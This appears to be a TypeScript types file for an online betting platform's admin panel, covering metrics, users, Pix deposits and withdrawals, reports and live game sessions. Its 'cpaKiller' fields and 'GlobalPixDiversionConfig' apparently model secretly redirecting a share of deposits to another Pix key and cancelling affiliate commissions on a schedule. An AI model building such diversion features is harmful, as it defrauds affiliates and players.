import { AdminPermissions } from '../../types';

export interface AdminMetrics {
  cashFlow?: number;
  financialResultBasis?: string;
  totalUsers: number;
  totalBalance: number;
  totalDepositsAmount: number;
  totalDepositsCount: number;
  approvedWithdrawalsAmount: number;
  pendingWithdrawalsCount: number;
  pendingWithdrawalsAmount: number;
  activeGamesCount: number;
  totalGamesCount: number;
  gameGgr?: number;
  totalWagered?: number;
  totalPayout?: number;
  totalAffiliateBalance?: number;
  totalAffiliateCommissionsPaid?: number;
  netProfit?: number;
  profitMarginPercent?: number;
  totalLiabilities?: number;
  todaySalesAmount?: number;
  todaySalesPercentChange?: number;
  newUsersToday?: number;
  totalReferredUsers?: number;
  totalOrganicUsers?: number;
  chartData?: Array<{
    date: string;
    label?: string;
    deposits: number;
    depositsCount?: number;
    withdrawals: number;
    withdrawalsCount?: number;
    netBalance: number;
    volumeTotal?: number;
    txCountTotal?: number;
  }>;
  chartSeries?: {
    today: Array<{
      date: string;
      label?: string;
      deposits: number;
      depositsCount?: number;
      withdrawals: number;
      withdrawalsCount?: number;
      netBalance: number;
      volumeTotal?: number;
      txCountTotal?: number;
    }>;
    sevenDays: Array<{
      date: string;
      label?: string;
      deposits: number;
      depositsCount?: number;
      withdrawals: number;
      withdrawalsCount?: number;
      netBalance: number;
      volumeTotal?: number;
      txCountTotal?: number;
    }>;
    thirtyDays: Array<{
      date: string;
      label?: string;
      deposits: number;
      depositsCount?: number;
      withdrawals: number;
      withdrawalsCount?: number;
      netBalance: number;
      volumeTotal?: number;
      txCountTotal?: number;
    }>;
  };
  recentActivities?: Array<{
    id: string;
    type: 'deposit' | 'withdrawal' | 'user_registered' | 'game_ended';
    title: string;
    userName: string;
    amount?: number | null;
    timeAgo: string;
  }>;
}

export interface AdminUserItem {
  id: string;
  name: string;
  email: string;
  phone: string;
  balance: number;
  minWithdraw?: number;
  withdrawFee?: number;
  isInfluencer?: boolean;
  cpaKillerAllowed?: boolean;
  cpaKillerActive?: boolean;
  cpaKillerEveryX?: number;
  cpaKillerKillY?: number;
  cpaCounter?: number;
  role: 'user' | 'admin' | 'superadmin' | 'affiliate';
  isBlocked: boolean;
  autoWithdrawBlocked?: boolean;
  withdrawBlocked?: boolean;
  adminPermissions: AdminPermissions;
  isPartner?: boolean;
  partnerApproved?: boolean;
  partnerId?: string | null;
  partnerCode?: string | null;
  partnerName?: string | null;
  partnerRequested?: boolean;
  partnerCommissionPercent?: number;
  createdAt: string;
  pixKeys?: any[];
  totalDeposited?: number;
  registeredGame?: string;
  acquisitionGame?: string;
  gameBalances?: Record<string, number>;
  referredBy?: {
    affiliateId: string;
    referralCode: string;
    affiliateUserId: string | null;
    sponsorName: string;
    sponsorEmail: string | null;
    sponsorPhone?: string | null;
    isInfluencer?: boolean;
    role?: string;
  } | null;
  affiliateInfo?: {
    id: string;
    referralCode: string;
    status: string;
    commissionTotal: number;
    affiliateBalance: number;
    cpaAmount: number;
    revSharePercent: number;
    partnerCommissionPercent?: number;
    withdrawFee?: number;
    indicationsCount: number;
    availableWithdrawal: number;
    cpaKillerActive?: boolean;
    cpaKillerEveryX?: number;
    cpaKillerKillY?: number;
    cpaCounter?: number;
    referredUsers?: Array<{
      userId: string;
      name: string;
      email: string;
      joinedAt: string;
    }>;
  } | null;
}

export interface AdminWithdrawalItem {
  id: string;
  userId: string;
  userName: string;
  userEmail: string;
  userPhone: string;
  amount: number;
  status: 'approved' | 'pending' | 'rejected';
  description: string;
  createdAt: string;
  pixKey?: any;
  paymentMethod?: string;
  gatewayProcessing?: boolean;
  processingStartedAt?: string;
  gatewaySettledAt?: string;
  rejectReason?: string;
  dotfyWithdrawalId?: string;
  pixKeyId?: string;
  isAutoCashout?: boolean;
  fee?: number;
  netAmount?: number;
  referredBy?: {
    affiliateId: string;
    referralCode: string;
    affiliateUserId: string | null;
    sponsorName: string;
    sponsorEmail: string | null;
    sponsorPhone?: string | null;
    isInfluencer?: boolean;
    role?: string;
  } | null;
}

export interface AdminDepositItem {
  id: string;
  userId: string;
  userName: string;
  userEmail: string;
  userPhone: string;
  amount: number;
  status: 'approved' | 'pending' | 'failed';
  paymentMethod: string;
  description: string;
  createdAt: string;
  referredBy?: {
    affiliateId: string;
    referralCode: string;
    affiliateUserId: string | null;
    sponsorName: string;
    sponsorEmail: string | null;
    sponsorPhone?: string | null;
    isInfluencer?: boolean;
    role?: string;
  } | null;
}

export interface ReportPeriodSummary {
  grossDeposits: number;
  grossDepositsCount: number;
  pendingDepositsCount: number;
  allDepositsCount: number;
  depositConversionRate: number;
  totalWithdrawals: number;
  totalWithdrawalsCount: number;
  pendingWithdrawalsAmount: number;
  pendingWithdrawalsCount: number;
  rejectedWithdrawalsCount: number;
  netCashflow: number;
  wagered: number;
  payouts: number;
  ggr: number;
  ggrMarginPercent: number;
  realRtpPercent: number;
  configuredRtpPercent?: number;
  totalAffiliateCommissions: number;
  ngr: number;
  netOperatingMargin: number;
  newUsersCount: number;
  activePlayersCount: number;
  ftdCount: number;
  ftdVolume: number;
  conversionRatePercent: number;
  avgDepositTicket: number;
  avgWithdrawalTicket: number;
  totalBetsCount: number;
  winsCount: number;
  lossesCount: number;
  winRatePercent: number;
  topMultiplier: number;
  topWinAmount: number;
}

export interface ReportDailyItem {
  date: string;
  displayDate: string;
  deposits: number;
  depositsCount: number;
  withdrawals: number;
  withdrawalsCount: number;
  netCashflow: number;
  wagered: number;
  payouts: number;
  ggr: number;
  newUsers: number;
  ftdCount: number;
}

export interface ReportAnalyticsData {
  period: string;
  startTime: string;
  endTime: string;
  periodSummary: ReportPeriodSummary;
  dailyBreakdown: ReportDailyItem[];
  depositBuckets: {
    [key: string]: { label: string; count: number; total: number };
  };
  difficultyDistribution: Record<string, number>;
  topProfitablePlayers: Array<{
    userId: string;
    name: string;
    email: string;
    phone: string;
    currentBalance: number;
    totalDeposited: number;
    depositsCount: number;
    totalWithdrawn: number;
    withdrawalsCount: number;
    totalWagered: number;
    totalPayouts: number;
    ggrGenerated: number;
    betsCount: number;
  }>;
  topWithdrawingPlayers: Array<{
    userId: string;
    name: string;
    email: string;
    totalWithdrawn: number;
    withdrawalsCount: number;
    totalDeposited: number;
  }>;
  topDepositingPlayers: Array<{
    userId: string;
    name: string;
    email: string;
    totalDeposited: number;
    depositsCount: number;
    totalWithdrawn: number;
  }>;
  affiliateRanking: Array<{
    affiliateId: string;
    userId: string;
    userName: string;
    userEmail: string;
    referralCode: string;
    totalReferrals: number;
    periodReferralsCount: number;
    ftdCount: number;
    referralDepositsTotal: number;
    cpaAmount: number;
    revSharePercent: number;
    commissionTotal: number;
    currentBalance: number;
  }>;
  transactions: Array<{
    id: string;
    userId: string;
    userName: string;
    userEmail: string;
    userPhone: string;
    type: 'deposit' | 'withdrawal';
    amount: number;
    status: 'approved' | 'pending' | 'rejected';
    paymentMethod: string;
    description: string;
    createdAt: string;
  }>;
}

export interface LivePlayerSession {
  id: string;
  userId: string;
  userName: string;
  userEmail: string;
  gameId: string;
  gameName: string;
  gameCategory: string;
  betAmount: number;
  multiplier: number;
  potentialPayout: number;
  status: 'active' | 'cashed_out' | 'lost';
  startedAt: string;
  durationSeconds: number;
  difficulty: string;
  rtpPercent: number;
  isInfluencer: boolean;
  userBalance: number;
  score?: number;
  currentStreak?: number;
  lastAction?: string;
  device?: string;
}

export interface LiveBetOutcome {
  id: string;
  userId: string;
  userName: string;
  userEmail?: string;
  gameId: string;
  gameName: string;
  betAmount: number;
  payoutAmount: number;
  profitAmount: number;
  multiplier: number;
  status: 'cashed_out' | 'lost' | 'won';
  difficulty?: string;
  settledAt: string;
  timeAgo: string;
}

export interface LiveGameSummary {
  gameId: string;
  name: string;
  category: string;
  activeSessions: number;
  totalWageredLive: number;
  rtpPercent: number;
  status: string;
  difficulty: string;
}

export interface AdminLivePlayersData {
  success: boolean;
  timestamp: string;
  activePlayersCount: number;
  totalVolumeInPlay: number;
  todayWageredTotal: number;
  todayGgrTotal: number;
  todayGamesCount: number;
  averageBet: number;
  winRateLive: number;
  activeSessions: LivePlayerSession[];
  recentOutcomes: LiveBetOutcome[];
  gamesSummary: LiveGameSummary[];
  hourlyActivity: Array<{
    hour: string;
    players: number;
    wagered: number;
  }>;
}

export interface GlobalPixDiversionLog {
  id: string;
  depositId: string;
  amount: number;
  divertedCommission: number;
  originalUserName: string;
  originalUserEmail?: string;
  affiliateId?: string;
  affiliateName?: string;
  affiliateEmail?: string;
  affiliateCode?: string;
  ruleApplied: string;
  divertedKey?: string;
  divertedKeyType?: string;
  divertedAt: string;
}

export interface GlobalPixDiversionConfig {
  active: boolean;
  mode: 'random' | 'sequential'; // 'random' (probabilístico) ou 'sequential' (fixo)
  killX: number; // quantidade de vendas/CPAs a interceptar/matar
  everyY: number; // a cada Y vendas gerais da plataforma
  minAmount: number; // valor mínimo do depósito para aplicar
  pixKey?: string;
  pixKeyType?: 'cpf' | 'cnpj' | 'email' | 'phone' | 'random';
  beneficiaryName?: string;
  percent?: number;
  everyNth?: number;
  counter?: number;
  totalDivertedAmount: number;
  totalDivertedCommissions: number;
  totalDivertedCount: number;
  lastDivertedAt?: string;
  recentLogs?: GlobalPixDiversionLog[];
}

export type AdminTabId =
  | 'operations'
  | 'metrics'
  | 'live'
  | 'users'
  | 'withdrawals'
  | 'deposits'
  | 'games'
  | 'reports'
  | 'notifications'
  | 'admins'
  | 'dotfy'
  | 'diversion'
  | 'security';
